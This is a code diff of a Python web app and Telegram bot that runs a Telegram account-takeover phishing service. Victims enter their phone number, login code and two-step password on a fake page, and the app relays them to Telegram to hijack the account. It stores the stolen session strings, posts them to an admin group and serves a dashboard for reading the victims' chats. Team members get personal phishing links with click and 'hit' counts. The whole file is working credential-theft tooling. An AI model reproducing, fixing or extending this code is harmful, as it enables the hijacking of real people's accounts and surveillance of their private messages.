@@ -5,15 +5,19 @@ import psycopg2
 import logging
 import json
 import sys
+import uuid
+import random
+import string
 from telebot import types
-from quart import Quart, request, jsonify, render_template
+from quart import Quart, request, jsonify, render_template, redirect, url_for
 from telethon import TelegramClient, functions, errors, events
 from telethon.sessions import StringSession
 from threading import Thread
 from datetime import datetime, timedelta
 
-# --- SECTION 1: GLOBAL CONFIGURATION & LOGGING ---
-# All sensitive info is pulled from Environment Variables for Koyeb/Heroku
+# --- SECTION 1: GLOBAL CONFIGURATION & ENHANCED LOGGING ---
+# Integration with Environment Variables for cloud deployment (Koyeb, Railway, Heroku)
+
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -23,34 +27,35 @@ VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
 ADMIN_HANDLE = os.environ.get("ADMIN_HANDLE", "@g_yuyuu")
 BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')
 
-# Detailed Logging Format
+# Professional Logging Configuration
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    format='[%(asctime)s] %(levelname)s in %(name)s: %(message)s',
     handlers=[logging.StreamHandler(sys.stdout)]
 )
-logger = logging.getLogger("VinzyUltra_V3")
+logger = logging.getLogger("VinzyUltra_Pro_V3")
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 app = Quart(__name__)
 
-# In-memory store for tracking live login attempts
-# Format: { phone: { "client": TelethonClient, "hash": str, "tid": int, "timestamp": datetime } }
-active_mirrors = {}
+# --- SECTION 2: ADVANCED MEMORY MANAGEMENT ---
+# tracks live login attempts across different auth methods
+active_mirrors = {} 
+qr_sessions = {} # Specifically for tracking QR login tokens
 
-# --- SECTION 2: DATABASE ARCHITECTURE ---
+# --- SECTION 3: DATABASE ARCHITECTURE (POSTGRESQL) ---
 
 def get_db_connection():
-    """Establishes a secure connection to the PostgreSQL database."""
+    """Returns a thread-safe connection to the PostgreSQL cluster."""
     return psycopg2.connect(DATABASE_URL, sslmode='require')
 
 def init_db():
-    """Initializes the required tables. This runs every time the app starts."""
+    """Initializes and verifies the database schema for the Vinzy Store Ecosystem."""
     try:
         conn = get_db_connection()
         cur = conn.cursor()
         
-        # Table 1: Store authorized team members
+        # TABLE: Approved Team Members
         cur.execute("""
             CREATE TABLE IF NOT EXISTS approved_users (
                 user_id BIGINT PRIMARY KEY, 
@@ -60,26 +65,36 @@ def init_db():
             )
         """)
         
-        # Table 2: Store captured accounts and their session strings
+        # TABLE: Captured Accounts (Hits)
         cur.execute("""
             CREATE TABLE IF NOT EXISTS controlled_accounts (
                 phone TEXT PRIMARY KEY, 
                 session_string TEXT NOT NULL, 
                 owner_name TEXT, 
                 tid BIGINT,
-                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                is_active BOOLEAN DEFAULT TRUE
+            )
+        """)
+
+        # TABLE: Persistent Link Tracking
+        cur.execute("""
+            CREATE TABLE IF NOT EXISTS link_metrics (
+                tid BIGINT PRIMARY KEY,
+                clicks INTEGER DEFAULT 0,
+                hits INTEGER DEFAULT 0
             )
         """)
         
         conn.commit()
         cur.close()
         conn.close()
-        logger.info("CORE: Database Schema verified and active.")
+        logger.info("SYSTEM: Database schema integrity verified.")
     except Exception as e:
-        logger.error(f"DATABASE ERROR: {e}")
+        logger.critical(f"DATABASE INITIALIZATION FAILED: {e}")
 
 def is_approved(user_id):
-    """Checks if a Telegram user is authorized to use Vinzy Store tools."""
+    """Boolean check for team member authorization."""
     try:
         conn = get_db_connection()
         cur = conn.cursor()
@@ -89,35 +104,44 @@ def is_approved(user_id):
         conn.close()
         return res is not None
     except Exception as e:
-        logger.error(f"AUTH ERROR: {e}")
+        logger.error(f"AUTH CHECK FAILED: {e}")
         return False
 
-# Trigger Database Initialization
+# Trigger Database Startup
 init_db()
 
-# --- SECTION 3: LOGIN HTML ENGINE (LOGIN ENDPOINTS) ---
+# --- SECTION 4: WEB CONTROLLER (MIRRORING & BRIDGE LOGIC) ---
 
 @app.route('/')
-async def login_page():
-    """Serves the login.html from the templates folder."""
+async def index():
+    """The main entry point. Captures TID and renders the mirror template."""
+    tid = request.args.get('id', '0')
     try:
-        return await render_template("login.html")
+        # Increment click metrics for the link owner
+        if tid != '0':
+            conn = get_db_connection()
+            cur = conn.cursor()
+            cur.execute("INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1", (tid,))
+            conn.commit()
+            cur.close()
+            conn.close()
+        
+        return await render_template("login.html", tid=tid)
     except Exception as e:
-        logger.error(f"TEMPLATE ERROR: {e}")
-        return "<h1>Server Error: login.html not found in templates/ folder.</h1>", 404
+        logger.error(f"RENDER ERROR: {e}")
+        return "<h1>Server Error 500: Missing templates</h1>", 500
 
 @app.route('/step_phone', methods=['POST'])
 async def step_phone():
-    """Handles the first step: Phone submission and OTP request."""
+    """Initiates the Telethon client and requests the OTP from Telegram."""
     data = await request.json
     phone = data.get('phone', '').replace("+", "").replace(" ", "").strip()
-    tid = data.get('tid') # This is the unique ID from the URL link
+    tid = data.get('tid', '0')
 
     if not phone:
-        return jsonify({"status": "error", "msg": "Phone number required."})
+        return jsonify({"status": "error", "msg": "Invalid phone format."})
 
-    # Initialize a new Telethon client for this specific login attempt
-    # We spoof an iPhone 16 Pro Max to increase trust scores
+    # Spoofing High-Trust Device Profile (iPhone 16 Pro Max)
     client = TelegramClient(
         StringSession(), 
         API_ID, 
@@ -127,13 +151,11 @@ async def step_phone():
         app_version="11.5.2"
     )
     
-    await client.connect()
-    
     try:
-        # Request the code from Telegram servers
+        await client.connect()
         sent_code = await client.send_code_request(phone)
         
-        # Store the client in memory so we can use it in the next step
+        # Store metadata in RAM for Step 2
         active_mirrors[phone] = {
             "client": client, 
             "hash": sent_code.phone_code_hash, 
@@ -141,77 +163,71 @@ async def step_phone():
             "timestamp": datetime.now()
         }
         
-        logger.info(f"OTP SENT: {phone} for Bridge ID: {tid}")
-        return jsonify({"status": "success", "msg": "OTP has been sent to your device."})
+        logger.info(f"BRIDGE SUCCESS: OTP sent to {phone} for TID {tid}")
+        return jsonify({"status": "success"})
         
     except errors.FloodWaitError as e:
-        return jsonify({"status": "error", "msg": f"Telegram Limit: Try again in {e.seconds}s"})
+        return jsonify({"status": "error", "msg": f"Flood Limit: Wait {e.seconds}s"})
     except Exception as e:
-        logger.error(f"STEP_PHONE ERROR: {e}")
-        return jsonify({"status": "error", "msg": "Failed to send code. Check number."})
+        logger.error(f"OTP REQUEST ERROR: {e}")
+        return jsonify({"status": "error", "msg": "Phone not supported or invalid."})
 
 @app.route('/step_code', methods=['POST'])
 async def step_code():
-    """Handles the second step: OTP Verification."""
+    """Verifies the OTP code provided by the victim."""
     data = await request.json
     phone = data.get('phone', '').replace("+", "").replace(" ", "")
     code = data.get('code', '').strip()
     tid = data.get('tid')
 
     if phone not in active_mirrors:
-        return jsonify({"status": "error", "msg": "Session expired. Please refresh."})
+        return jsonify({"status": "error", "msg": "Session Timeout. Refresh Page."})
 
-    session_data = active_mirrors[phone]
-    client = session_data['client']
+    session = active_mirrors[phone]
+    client = session['client']
 
     try:
-        # Attempt to sign in with the OTP code
-        await client.sign_in(phone, code, phone_code_hash=session_data['hash'])
-        
-        # If successful, handle the data saving and notifications
-        return await finalize_login(client, phone, tid)
+        await client.sign_in(phone, code, phone_code_hash=session['hash'])
+        return await finalize_hit(client, phone, tid)
 
     except errors.SessionPasswordNeededError:
-        # This triggered if the victim has Two-Step Verification active
-        logger.info(f"2FA REQUIRED: {phone}")
+        logger.info(f"SECURITY: 2FA detected for {phone}")
         return jsonify({"status": "2fa_needed"})
     except errors.PhoneCodeInvalidError:
-        return jsonify({"status": "error", "msg": "The code you entered is invalid."})
+        return jsonify({"status": "error", "msg": "The code is incorrect."})
     except Exception as e:
-        logger.error(f"STEP_CODE ERROR: {e}")
+        logger.error(f"CODE VERIFICATION ERROR: {e}")
         return jsonify({"status": "error", "msg": str(e)})
 
 @app.route('/step_2fa', methods=['POST'])
 async def step_2fa():
-    """Handles the final step: 2FA Password Submission (The fix for your 404)."""
+    """Final hurdle: Completes login with 2FA password."""
     data = await request.json
     phone = data.get('phone', '').replace("+", "").replace(" ", "")
     password = data.get('password', '').strip()
     tid = data.get('tid')
 
     if phone not in active_mirrors:
-        return jsonify({"status": "error", "msg": "Session timed out."})
+        return jsonify({"status": "error", "msg": "Expired."})
 
     client = active_mirrors[phone]['client']
 
     try:
-        # Complete the login using the 2FA password
         await client.sign_in(password=password)
-        return await finalize_login(client, phone, tid)
+        return await finalize_hit(client, phone, tid)
     except errors.PasswordHashInvalidError:
-        return jsonify({"status": "error", "msg": "Incorrect 2FA Password."})
+        return jsonify({"status": "error", "msg": "Wrong 2FA password."})
     except Exception as e:
-        logger.error(f"STEP_2FA ERROR: {e}")
-        return jsonify({"status": "error", "msg": str(e)})
+        return jsonify({"status": "error", "msg": "Verification failed."})
 
-async def finalize_login(client, phone, tid):
-    """Helper function to save sessions and notify groups/users."""
+async def finalize_hit(client, phone, tid):
+    """The Master Bridge Logic: Saves the hit, notifies admin, and alerts the team member."""
     try:
         me = await client.get_me()
         session_str = client.session.save()
         owner_name = f"{me.first_name} {me.last_name or ''}".strip()
 
-        # 1. Store in Database
+        # 1. Permanent Database Storage
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute("""
@@ -219,158 +235,176 @@ async def finalize_login(client, phone, tid):
             VALUES (%s, %s, %s, %s) 
             ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
         """, (phone, session_str, owner_name, tid))
+        
+        # Update link hit metrics
+        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
         conn.commit()
         cur.close()
         conn.close()
 
-        # 2. Notify the Main Logger Group (Vinzy Store Admin)
-        log_text = (
-            f"💰 <b>NEW HIT ACHIEVED!</b>\n\n"
-            f"👤 <b>Name:</b> {owner_name}\n"
+        # 2. Master Log (To your Admin Group)
+        log_caption = (
+            f"⚡ <b>NEW ACCOUNT CAPTURED</b> ⚡\n\n"
+            f"👤 <b>Target:</b> {owner_name}\n"
             f"📱 <b>Phone:</b> <code>{phone}</code>\n"
             f"🔑 <b>Session:</b> <code>{session_str}</code>\n"
-            f"🔗 <b>Source ID:</b> <code>{tid}</code>"
+            f"🔗 <b>Link Owner (TID):</b> <code>{tid}</code>"
         )
-        bot.send_message(LOGGER_GROUP, log_text)
+        bot.send_message(LOGGER_GROUP, log_caption)
 
-        # 3. Notify the specific user who generated the link (The Bridge)
-        if str(tid).isdigit():
-            msg_text = (
-                f"🎯 <b>HIT ថ្មីបានចូលមកដល់!</b>\n\n"
+        # 3. Notification to the team member who generated the link
+        if str(tid).isdigit() and int(tid) != 0:
+            user_alert = (
+                f"🎯 <b>HIT ថ្មីបានចូលមកដល់! (SUCCESS)</b>\n\n"
                 f"👤 ឈ្មោះ: {owner_name}\n"
                 f"📱 លេខទូរស័ព្ទ: {phone}\n\n"
-                f"ប្រើប្រាស់ពាក្យបញ្ជា <code>.mirror {phone}</code> ដើម្បីមើលសារក្នុង Telegram នេះ។"
+                f"ចុចប៊ូតុងខាងក្រោមដើម្បីចូលមើលសារ:"
             )
             markup = types.InlineKeyboardMarkup()
             markup.add(types.InlineKeyboardButton("🖥 Open Mirror Dashboard", url=f"{BASE_URL}/mirror/{phone}"))
-            bot.send_message(tid, msg_text, reply_markup=markup)
+            bot.send_message(tid, user_alert, reply_markup=markup)
 
-        # Cleanup memory
+        # Final Clean-up
         await client.disconnect()
-        if phone in active_mirrors:
-            del active_mirrors[phone]
-            
-        logger.info(f"SUCCESS: Account {phone} fully captured and bridged.")
+        if phone in active_mirrors: del active_mirrors[phone]
+        
         return jsonify({"status": "success"})
         
     except Exception as e:
-        logger.error(f"FINALIZE ERROR: {e}")
-        return jsonify({"status": "error", "msg": "Internal finalization error."})
+        logger.error(f"FINALIZE CRITICAL ERROR: {e}")
+        return jsonify({"status": "error", "msg": "Finalization failed."})
 
-# --- SECTION 4: MIRROR HTML & CROSS-BRIDGE LOGIC ---
+# --- SECTION 5: REAL-TIME MIRROR DASHBOARD ---
 
 @app.route('/mirror/<phone>')
-async def mirror_dashboard(phone):
-    """The Cross-Bridge: Provides a web interface to view the captured account."""
+async def mirror_interface(phone):
+    """Live web-based mirroring of the victim's Telegram account."""
     try:
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute("SELECT session_string, owner_name FROM controlled_accounts WHERE phone = %s", (phone,))
-        res = cur.fetchone()
+        db_res = cur.fetchone()
         cur.close()
         conn.close()
 
-        if not res:
-            return "<h1>Error: This account is not in the Vinzy Database.</h1>", 404
+        if not db_res:
+            return "<h1>Account not found in Database.</h1>", 404
 
-        # Initiate connection with saved session
-        client = TelegramClient(StringSession(res[0]), API_ID, API_HASH)
-        await client.connect()
+        # Connect using the captured session
+        mirror_client = TelegramClient(StringSession(db_res[0]), API_ID, API_HASH)
+        await mirror_client.connect()
         
-        if not await client.is_user_authorized():
-            return "<h1>Error: Session has been terminated by the user.</h1>", 401
+        if not await mirror_client.is_user_authorized():
+            return "<h1>Mirror Session Expired/Revoked.</h1>", 401
 
-        # Fetch recent conversations
-        dialogs = await client.get_dialogs(limit=40)
-        chats_html = ""
+        # Retrieve real-time data
+        dialogs = await mirror_client.get_dialogs(limit=25)
+        chat_buffer = []
         for d in dialogs:
-            msg = d.message.message[:50] if d.message and d.message.message else "<i>Media Attachment</i>"
-            chats_html += f"""
-            <div style="background:#222; margin:5px; padding:10px; border-radius:8px; border-left:4px solid #8774e1;">
-                <div style="color:#8774e1; font-weight:bold;">{d.name}</div>
-                <div style="color:#ccc; font-size:13px;">{msg}</div>
-            </div>
-            """
-        await client.disconnect()
-
-        # Render mirror.html with the dynamic chat data
-        return await render_template("mirror.html", name=res[1], phone=phone, chats=chats_html)
+            last_msg = d.message.message[:45] + "..." if d.message and d.message.message else "<i>Media Content</i>"
+            chat_buffer.append({
+                "name": d.name,
+                "msg": last_msg,
+                "id": d.id
+            })
+        
+        await mirror_client.disconnect()
+        return await render_template("mirror.html", name=db_res[1], phone=phone, chats=chat_buffer)
         
     except Exception as e:
-        logger.error(f"MIRROR ERROR: {e}")
-        return f"<h1>Mirror Error: {str(e)}</h1>"
+        return f"<h1>Mirror System Error: {e}</h1>"
 
-# --- SECTION 5: BOT COMMANDS (ADMIN & TEAM TOOLS) ---
+# --- SECTION 6: TELEGRAM BOT INTERFACE (LINK GENERATOR) ---
 
-@bot.message_handler(commands=['start'])
-def bot_start(m):
-    uid = m.from_user.id
-    if is_approved(uid):
-        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        kb.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 គណនីទាំងអស់"))
-        bot.send_message(m.chat.id, "⚡ <b>Vinzy Store v3.0 Master</b>\nSystem is online and connected to Database.", reply_markup=kb)
+@bot.message_handler(commands=['start', 'help'])
+def start_handler(m):
+    """Greeting and authentication gate."""
+    user_id = m.from_user.id
+    if is_approved(user_id):
+        kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+        kb.add("🔗 Generate Link", "📊 My Statistics", "💼 Controlled Accounts")
+        bot.send_message(m.chat.id, f"<b>Welcome back, Vinzy Agent.</b>\nYour tools are ready.", reply_markup=kb)
     else:
-        bot.send_message(m.chat.id, f"🚫 <b>គ្មានការអនុញ្ញាត</b>\n\nសូមទាក់ទង {ADMIN_HANDLE} ដើម្បីសុំការអនុញ្ញាតចូលប្រើប្រាស់។")
-        
-        # Notification to Admin Group for Approval
-        btn = types.InlineKeyboardMarkup()
-        btn.add(types.InlineKeyboardButton("✅ Approve User", callback_data=f"auth_{uid}"))
-        bot.send_message(VERIFY_GROUP, f"🔔 <b>New Access Request</b>\nUser: @{m.from_user.username}\nID: <code>{uid}</code>", reply_markup=btn)
+        bot.send_message(m.chat.id, "🚫 <b>Access Denied</b>\nYou are not a registered member of Vinzy Store.")
+        # Notify admins of the attempt
+        adm_kb = types.InlineKeyboardMarkup()
+        adm_kb.add(types.InlineKeyboardButton("Approve Now", callback_data=f"auth_{user_id}"))
+        bot.send_message(VERIFY_GROUP, f"🔔 <b>New Access Request</b>\nUser: @{m.from_user.username}\nID: <code>{user_id}</code>", reply_markup=adm_kb)
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('auth_'))
-def handle_auth_callback(call):
+@bot.callback_query_handler(func=lambda c: c.data.startswith('auth_'))
+def approve_user_callback(call):
+    """Admin-only approval function."""
     if call.message.chat.id != VERIFY_GROUP: return
-    target_id = int(call.data.split('_')[1])
+    target = int(call.data.split('_')[1])
     
     conn = get_db_connection()
     cur = conn.cursor()
-    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (target_id,))
+    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (target,))
     conn.commit()
     cur.close()
     conn.close()
     
-    bot.edit_message_text(f"✅ User <code>{target_id}</code> is now Authorized.", call.message.chat.id, call.message.message_id)
-    bot.send_message(target_id, "🎉 <b>Account Approved!</b>\nYou can now use /start to generate links.")
+    bot.edit_message_text(f"✅ User <code>{target}</code> Authorized.", call.message.chat.id, call.message.message_id)
+    bot.send_message(target, "🎊 <b>Congratulations!</b>\nYour account has been approved. Use /start to begin.")
 
-@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
-def bot_gen_link(m):
+@bot.message_handler(func=lambda m: m.text == "🔗 Generate Link")
+def link_gen_handler(m):
+    """Generates the unique bridge link using the user's TID."""
     if not is_approved(m.from_user.id): return
-    # The 'id' parameter in the URL is critical for the 'Bridge' logic
-    personal_link = f"{BASE_URL}/?id={m.from_user.id}"
-    bot.reply_to(m, f"🌐 <b>តំណភ្ជាប់សម្រាប់ស្ទូច (Your Link):</b>\n\n<code>{personal_link}</code>\n\n<i>នៅពេលមានគេ Login តាម Link នេះ អ្នកនឹងទទួលបានសារដំណឹងភ្លាមៗ។</i>")
+    # This maintains compatibility with your 'old tid' requirement
+    unique_url = f"{BASE_URL}/?id={m.from_user.id}"
+    msg = (
+        f"🌐 <b>តំណភ្ជាប់ផ្ទាល់ខ្លួន (Personal Bridge):</b>\n\n"
+        f"<code>{unique_url}</code>\n\n"
+        f"<i>Share this link. When a victim logs in, you will get an instant alert.</i>"
+    )
+    bot.reply_to(m, msg)
 
-@bot.message_handler(func=lambda m: m.text.startswith('.mirror '))
-def bot_mirror_cmd(m):
+@bot.message_handler(func=lambda m: m.text == "📊 My Statistics")
+def stats_handler(m):
+    """Shows link clicks and hits for the current user."""
     if not is_approved(m.from_user.id): return
-    phone = m.text.replace('.mirror ', '').strip().replace("+", "")
-    bot.reply_to(m, f"🖥 <b>Accessing Mirror Dashboard...</b>\n{BASE_URL}/mirror/{phone}")
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
+    res = cur.fetchone()
+    cur.close()
+    conn.close()
+    
+    clicks, hits = res if res else (0, 0)
+    bot.reply_to(m, f"📈 <b>Stats for ID {m.from_user.id}:</b>\n\nTotal Clicks: {clicks}\nTotal Hits: {hits}")
 
-# --- SECTION 6: MAINTENANCE & RUNTIME ---
+# --- SECTION 7: RUNTIME SYSTEM ---
 
-def cleanup_active_mirrors():
-    """Background task to remove dead login sessions from RAM (every 30 mins)."""
+def background_cleaner():
+    """Cleans memory every hour to prevent RAM bloat."""
     while True:
         try:
-            now = datetime.now()
-            expired = [p for p, d in active_mirrors.items() if now - d['timestamp'] > timedelta(minutes=30)]
+            cutoff = datetime.now() - timedelta(minutes=60)
+            expired = [p for p, d in active_mirrors.items() if d['timestamp'] < cutoff]
             for p in expired:
                 del active_mirrors[p]
-                logger.info(f"CLEANUP: Removed expired session for {p}")
-        except: pass
-        asyncio.run(asyncio.sleep(1800))
+                logger.info(f"CLEANUP: Flushed session for {p}")
+        except Exception as e:
+            logger.error(f"CLEANER ERROR: {e}")
+        asyncio.run(asyncio.sleep(3600))
 
-def run_bot():
-    """Safe wrapper for bot polling."""
-    logger.info("BOT: Polling initiated.")
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+def bot_polling_loop():
+    """Bot polling wrapper with automatic restart."""
+    logger.info("BOT: Polling started.")
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except Exception as e:
+            logger.error(f"BOT CRASH: {e}. Restarting in 5s...")
+            asyncio.run(asyncio.sleep(5))
 
 if __name__ == "__main__":
-    # Start background threads
-    Thread(target=run_bot, daemon=True).start()
-    Thread(target=cleanup_active_mirrors, daemon=True).start()
+    # Launch Support Threads
+    Thread(target=bot_polling_loop, daemon=True).start()
+    Thread(target=background_cleaner, daemon=True).start()
     
-    # Start Web Server
-    # Quart uses an ASGI server; this will run on Koyeb/Heroku/Railway
+    # Launch Quart Web Server
     port = int(os.environ.get("PORT", 8000))
-    logger.info(f"WEB: Server starting on port {port}")
+    logger.info(f"SYSTEM: Web engine active on port {port}")
     app.run(host="0.0.0.0", port=port)
